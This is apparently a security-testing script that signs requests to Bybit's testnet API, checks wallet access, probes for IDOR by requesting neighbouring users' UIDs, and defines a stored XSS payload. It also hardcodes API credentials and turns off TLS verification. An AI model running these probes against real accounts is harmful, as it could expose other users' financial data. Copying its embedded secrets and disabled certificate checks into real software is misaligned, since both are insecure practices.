#!/usr/bin/env python3
"""
Authenticated tests for Bybit API (Testnet)
Verifies keys and performs initial IDOR checks.
"""
import requests
import time
import hmac
import hashlib
import json
import urllib.parse

# Configuration
API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
MY_UID = "527465456"
BASE_URL = "https://api-testnet.bybit.com"

requests.packages.urllib3.disable_warnings()

def get_signature(params, api_secret):
    """Generate HMAC SHA256 signature"""
    return hmac.new(
        bytes(api_secret, "utf-8"), 
        bytes(params, "utf-8"), 
        hashlib.sha256
    ).hexdigest()

def send_request(method, endpoint, payload=None):
    """Send signed request to Bybit API"""
    timestamp = str(int(time.time() * 1000))
    recv_window = "5000"
    
    if method == "GET":
        # For GET, params are query string
        params_str = urllib.parse.urlencode(payload) if payload else ""
        full_url = f"{BASE_URL}{endpoint}?{params_str}"
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
    else:
        # For POST, params are JSON body
        params_str = json.dumps(payload) if payload else "{}"
        full_url = f"{BASE_URL}{endpoint}"
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
        
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = {
        "X-BAPI-API-KEY": API_KEY,
        "X-BAPI-SIGN": signature,
        "X-BAPI-SIGN-TYPE": "2",
        "X-BAPI-TIMESTAMP": timestamp,
        "X-BAPI-RECV-WINDOW": recv_window,
        "Content-Type": "application/json"
    }
    
    try:
        if method == "GET":
            response = requests.get(full_url, headers=headers, verify=False, timeout=10)
        else:
            response = requests.post(full_url, headers=headers, data=params_str, verify=False, timeout=10)
            
        return response.json()
    except Exception as e:
        return {"error": str(e)}

print("="*80)
print("AUTHENTICATED VULNERABILITY SCAN")
print("="*80)

# 1. Verify Keys
print("\n[1] VERIFYING API KEYS")
print("-" * 80)

# Get Wallet Balance
balance_res = send_request("GET", "/v5/account/wallet-balance", {"accountType": "UNIFIED"})
print(f"Wallet Balance Response Code: {balance_res.get('retCode')}")
if balance_res.get('retCode') == 0:
    print("✅ Keys are VALID")
    print(f"  Msg: {balance_res.get('retMsg')}")
    # print(f"  Data: {str(balance_res.get('result'))[:100]}...")
else:
    print("❌ Keys are INVALID or Permissions Missing")
    print(f"  Full Response: {balance_res}")
    exit()

# 2. IDOR Testing
print("\n\n[2] TESTING IDOR (Insecure Direct Object Reference)")
print("-" * 80)

target_uids = ["527465455", "1", "1000000", "99999999", int(MY_UID)-1, int(MY_UID)+1]

endpoints_to_test = [
    # endpoint, param_name
    ("/v5/account/wallet-balance", "accountType", "UNIFIED"), # Special case, needs UID in some implementations? No, Bybit usually uses token to identify user.
    # Let's try to pass UID as a parameter if the API ignores it but logs it, or if it accidentally honors it
]

# Bybit V5 API uses the API key to identify the user. 
# IDOR here means: Can I access sub-accounts that are NOT mine? Or can I pass 'uid' or 'memberId' parameter to view others?

test_params = [
    {"accountType": "UNIFIED", "uid": "12345"},
    {"accountType": "UNIFIED", "memberId": "12345"},
    {"accountType": "UNIFIED", "user_id": "12345"},
    {"accountType": "UNIFIED", "subMemberId": "12345"}
]

for params in test_params:
    # Try with a different UID
    target_uid = str(int(MY_UID) - 1) # Try previous user
    
    # Create copy of params and update UID key
    p = params.copy()
    key_to_update = list(p.keys())[1] # get the uid/memberId key
    p[key_to_update] = target_uid
    
    print(f"\nTesting /v5/account/wallet-balance with {p}")
    res = send_request("GET", "/v5/account/wallet-balance", p)
    
    if res.get('retCode') == 0:
        # Check if the returned data matches MY_UID or TARGET_UID
        # Usually response doesn't contain UID at top level, but let's check structure
        print(f"  Status: {res.get('retCode')} (OK)")
        result = res.get('result', {})
        list_data = result.get('list', [])
        if list_data:
             # Check if any account info reflects the requested UID
             print(f"  Result count: {len(list_data)}")
             # Note: If it returns MY data, it's ignoring the param (Safe but boring). 
             # If it returns OTHER data, it's IDOR (JACKPOT).
             # If it errors, it's likely validating.
    else:
        print(f"  Status: {res.get('retCode')} - {res.get('retMsg')}")

# 3. Testing Sub-Account IDOR (Common vector)
print("\n\n[3] TESTING SUB-ACCOUNT PERMISSIONS")
print("-" * 80)
# Try to list sub-accounts (requires permission, but let's see if we can see others)
sub_res = send_request("GET", "/v5/user/sub-apikeys") 
print(f"Sub-keys Response: {sub_res.get('retCode')} - {sub_res.get('retMsg')}")


# 4. Testing Stored XSS in Nickname (if endpoints available)
print("\n\n[4] TESTING STORED XSS IN PROFILE")
print("-" * 80)

xss_payload = '"><img src=x onerror=alert(1)>'
# Update username/nickname endpoint?
# Based on API docs, /v5/user/update-sub-api is management.
# Let's check /v5/user/query-api for current info
user_info = send_request("GET", "/v5/user/query-api")
print(f"User Info: {user_info.get('retCode')}")
if user_info.get('result'):
    print(f"  Current settings: {str(user_info.get('result'))[:200]}")


print("\n" + "="*80)
print("AUTHENTICATED SCAN COMPLETE")
print("="*80)
